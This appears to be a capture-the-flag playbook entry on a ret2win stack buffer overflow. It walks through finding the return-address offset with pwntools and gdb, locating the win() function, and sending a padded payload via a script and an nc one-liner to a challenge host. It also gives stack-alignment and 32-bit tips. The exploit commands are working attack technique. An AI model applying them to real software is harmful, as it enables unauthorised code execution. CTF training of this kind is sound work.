# ret2win (stack buffer overflow → call `win()`)

**Signs**: binary asks for input with `gets`/unbounded read, no canary, no PIE, a function that
prints the flag. Hint "it will not count the letters — say something quite long".

## 1. Find the offset to the saved return address
```bash
# cyclic pattern
python -c "from pwn import *;print(cyclic(200).decode())" | ./vuln     # crashes
gdb -q ./vuln -ex 'run < <(python -c "from pwn import *;import sys;sys.stdout.buffer.write(cyclic(200))")' \
    -ex 'x/gx $rsp' -ex quit
python -c "from pwn import *;print(cyclic_find(0x6161616161616174))"   # value at $rsp → offset
```
Or reason it: `char buf[64]` + saved `rbp` (8) ⇒ **72** on x86-64 (`sub rsp,0x40`).

## 2. Address of `win`
```bash
objdump -d vuln | grep '<win>:'          # e.g. 0000000000401196 <win>:
python -c "from pwn import *;print(hex(ELF('vuln').symbols['win']))"
```

## 3. Send it
```bash
python scripts/pwn/ret2win.py ./vuln pwn1.chal.deti 9001 --offset 72 --func win
python -c "import sys,struct;sys.stdout.buffer.write(b'A'*72+struct.pack('<Q',0x401196)+b'\n')" | nc pwn1.chal.deti 9001
```

## Gotchas
- **Stack alignment** (`movaps` crash in `system`/`printf` inside win on x86-64): add a `ret`
  gadget before `win` (`payload = pad + p64(ret) + p64(win)`), or jump to `win+1`/`win+5` (skip `push rbp`).
- 32-bit: offset = buf + 4 (saved ebp), address `p32`, args on the stack after a fake return.
- `win(int a)` with a check → set `rdi` via ROP → [rop-basics](rop-basics.md).
- Newline/`\x00` in addresses may cut `gets`/`scanf` input differently — `gets` stops only at `\n`.

Seen in: `pwn1` (`gets` into 64-byte buffer, no canary/PIE, offset 72, `win()` prints the flag).
